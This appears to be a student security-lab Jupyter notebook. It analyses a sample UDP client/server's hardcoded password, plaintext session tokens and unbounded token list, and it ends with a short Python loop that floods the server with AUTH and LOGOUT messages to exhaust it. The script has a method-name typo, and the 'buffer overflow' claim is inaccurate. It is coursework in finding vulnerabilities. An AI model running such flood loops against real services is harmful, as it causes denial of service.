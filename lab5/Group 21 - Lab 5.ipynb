{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d602d795",
   "metadata": {},
   "source": [
    "# Group 21 Lab 5\n",
    "##### Group Members: (Andrew Quijano, afq2003), (Isaiah Genis | ig596), (Jamie Leach | jhl925), (Yevhen Pankevych | yp2525)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "722aa272",
   "metadata": {},
   "source": [
    "Your first goal as a Security Engineer who wants to ensure the security of the application is to identify security vulnerabilities in the project and create testcases to exploit them. In the real world, applications are often tested with test scripts. The following are a few questions a Security Engineer would ask when writing a testcase to test the Security of their application:\n",
    "\n",
    "* \"Does this application protect the confidentiaility of data?\"\n",
    "* \"Does this application hamper performance?\"\n",
    "* \"Does this application prevent actions that shoudl be allowed?\"\n",
    "\n",
    "Notice that these questions are parallel to security paradigms: Security, Efficiency and Accuracy, Availability. If you can find a hypothesis where a security paradigm is not met that would mean the application is not secure and a possible exploit exist. The testcases can be written in python or bash."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f92f2715",
   "metadata": {},
   "source": [
    "### Task:\n",
    "We have listed hints for 3 vulnerabilities below which are currently present in code. Your task is to explain how it violates the security regulations (in terms of the above questions) and then provide the testcases to demonstrate how these vulnerabilities can be exploited.\n",
    "* Password is Hardcoded (SampleNetworkClient.py)\n",
    "* Token List has the potential to continuously grow (SampleNetworkServer.py)\n",
    "* Plaintext authentication token and authentication (SampleNetworkClient.py)\n",
    "\n",
    "### Submission:\n",
    "For each vulnerability above:\n",
    "\n",
    "1. describe how it answers the three questions mentioned above.\n",
    "2. Provide test cases (in python or bash) to demonstrate how these vulnerabilities can be exploited."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7d0d6267",
   "metadata": {},
   "source": [
    "### Part 1: Describe how it answers the three questions mentioned above.\n",
    "\n",
    "* Does this application protect the confidentiality of data?\"\n",
    "\n",
    "    * No, the application cannot protect the confidentiality of data. \n",
    "        1. This is because a vulnerability was discovered in the ‘SampleNetworkClient.py’ part of the application, shown below, which contains a function that passes/stores a hardcoded password value to send it within a message to the Server side socket. Hardcoded credentials generally pose a security risk to an application as an attacker can reverse engineer the code to obtain the password to use elsewhere. In this case an attacker would be able to impersonate/seize the client’s account as their username/password has been exposed. The relevant code has been commented below and a test case has been written in Python/Bash to demonstrate how to exploit this vulnerability."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "99bb158e",
   "metadata": {},
   "outputs": [],
   "source": [
    "# SampleNetworkClient.py:\n",
    "def authenticate(self, p, pw) : #pw variable here takes in raw input from user/client calling the function.\n",
    "        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "        s.sendto(b\"AUTH %s\" % pw, (\"127.0.0.1\", p)) #pw variable here is exposed and/or is not used in authentication\n",
    "        msg, addr = s.recvfrom(1024)\n",
    "        return msg.strip()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c285fe89",
   "metadata": {},
   "source": [
    "* Does this application protect the confidentiality of data?\"\n",
    "\n",
    "    * No, the application cannot protect the confidentiality of data. \n",
    "        2. Additionally another vulnerability was discovered in the ‘SampleNetworkClient.py’ & ‘SampleNetworkServer.py’ part of the application, shown below, which contains plaintext authentication tokens, which are values used to identify/track valid logged in user sessions and passes these values between the Client and Server side sockets. Plaintext session tokens jeopardize active sessions within the application as an attacker can easily identify which user/session is running on the system and could potentially terminate a client’s session. This vulnerability also enables a Man-in-the-middle attack, which allows an attacker to obtain an unencrypted token and use it to impersonate and act on behalf of a legitimate user. The relevant code has been commented below and a test case has been written in Python/Bash to demonstrate how to exploit this vulnerability."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e12e8e1d",
   "metadata": {},
   "outputs": [],
   "source": [
    "#SampleNetworkClient.py:\n",
    "def updateInfTemp(self, frame) :\n",
    "        self.updateTime()\n",
    "        if self.infToken is None : #not yet authenticated\n",
    "            self.infToken = self.authenticate(self.infPort, b\"!Q#E%T&U8i6y4r2w\") # this token is exposed/plaintext\n",
    "\n",
    "  def updateIncTemp(self, frame) :\n",
    "        self.updateTime()\n",
    "        if self.incToken is None : #not yet authenticated\n",
    "            self.incToken = self.authenticate(self.incPort, b\"!Q#E%T&U8i6y4r2w\") # this token is exposed/plaintext"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9fe1336a",
   "metadata": {},
   "outputs": [],
   "source": [
    "#SampleNetworkServer.py:\n",
    "if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" : # this token is exposed/plaintext\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3f006568",
   "metadata": {},
   "source": [
    "* \"Does this application hamper performance?\"\n",
    "\n",
    "    * Yes, the application currently hampers performance in several ways:\n",
    "        1. The hardcoded password mentioned before currently speeds up the overall client/user experience in authentication however this poses a risk to the overall security/performance as the password is not able to be easily changed if it has been compromised. \n",
    "        2. A vulnerability was discovered in the ‘SampleNetworkServer.py’ part of the application which allows the array “self.tokens”, that is used to stores generated token values for each authenticated session, to continuously grow if authenticated sessions continually occur without ‘logouts’. This vulnerability can lead to performance issues should the list become too long and could also lead to a buffer overflow if attacked. The relevant code has been highlighted below and a test case (XXX) has been written in Python/Bash to demonstrate this vulnerability.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ef2c07f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# SampleNetworkServer.py\n",
    "def processCommands(self, msg, addr) :\n",
    "        cmds = msg.split(';')\n",
    "        for c in cmds :\n",
    "            cs = c.split(' ')\n",
    "            if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" :\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        #self.tokens.append is a vulnerability as there is no limit specified for the array\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n",
    "                        #print (self.tokens[-1])\n",
    "                elif cs[0] == \"LOGOUT\":\n",
    "                    if cs[1] in self.tokens :\n",
    "                        self.tokens.remove(cs[1])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "69eb508d",
   "metadata": {},
   "source": [
    "* \"Does this application prevent actions that should be allowed?\"\n",
    "\n",
    "    * Yes, this system has potential vulnerabilities that can cause a refusal to perform the correct action\n",
    "        1. An unencrypted token, as mentioned earlier, can be intercepted by an attacker and used to cause deauthentication of that user. Thus, a legitimate user will lose access to the system and require re-authentication.\n",
    "        2. Also, the system can potentially become unavailable due to a DOS attack aimed at overflowing the list of available tokens or calling the logout procedure with any data (‘SampleNetworkServer.py’) - this is possible due to the fact that the size of the list is not fixed and can be quite large - then the time to search for an invalid token will be equal to the viewing time of all items in the list, which can cause delays in the operation of the server, up to the failure of its operation. The relevant code has been highlighted below."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "3af0c606",
   "metadata": {},
   "outputs": [],
   "source": [
    "def processCommands(self, msg, addr) :\n",
    "        cmds = msg.split(';')\n",
    "        for c in cmds :\n",
    "            cs = c.split(' ')\n",
    "            if len(cs) == 2 : #should be either AUTH or LOGOUT\n",
    "                if cs[0] == \"AUTH\":\n",
    "                    if cs[1] == \"!Q#E%T&U8i6y4r2w\" :\n",
    "                        self.tokens.append(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16)))\n",
    "                        self.serverSocket.sendto(self.tokens[-1].encode(\"utf-8\"), addr)\n",
    "                        #print (self.tokens[-1])\n",
    "                elif cs[0] == \"LOGOUT\":\n",
    "                    if cs[1] in self.tokens :#The array is not fixed limit and could DDOS system if the list becomes too large/attacked \n",
    "                        self.tokens.remove(cs[1])\n",
    "                else : #unknown command\n",
    "                    self.serverSocket.sendto(b\"Invalid Command\\n\", addr)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "094809fc",
   "metadata": {},
   "source": [
    "### Part 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f1ee3f7",
   "metadata": {},
   "outputs": [],
   "source": [
    "#Exploit script for “Token List has the potential to continuously grow”:\n",
    "\n",
    "import socket\n",
    "\n",
    "while True:\n",
    "    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "    s.sendto(b\"AUTH !Q#E%T&U8i6y4r2w\", (\"127.0.0.1\", 23456))\n",
    "    msg, addr = s.recfrom(1024)\n",
    "    \n",
    "    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n",
    "    s.sendto(b\"LOGOUT random-token\", (\"127.0.0.1\", 23456))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
